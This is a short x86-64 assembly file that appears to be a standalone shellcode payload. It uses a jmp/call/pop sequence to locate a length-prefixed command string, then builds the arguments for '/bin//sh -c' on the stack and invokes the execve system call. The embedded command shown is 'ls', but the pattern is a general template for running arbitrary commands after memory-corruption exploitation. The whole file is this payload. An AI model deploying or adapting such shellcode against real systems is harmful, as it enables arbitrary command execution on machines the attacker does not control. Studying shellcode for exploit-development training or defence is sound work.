        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop rax
        xor rdx, rdx
        lea rbx, [rax+1]
        movzx rcx, byte ptr [rax]
        add rcx, rbx
        mov [rcx], dl
        xor rdx, rdx
        xor rcx, rcx
        mov cx, 0x632d               /* "-c" */
        push rcx
        mov rsi, rsp
        push rdx
        mov rdi, 0x68732f2f6e69622f  /* "/bin//sh" */
        push rdi
        mov rdi, rsp
        push rdx
        push rbx
        push rsi
        push rdi
        mov rsi, rsp
        push 59                      /* execve */
        pop rax
        syscall
caller:
        call callee
pstring:
        .byte 2
        .ascii "ls"
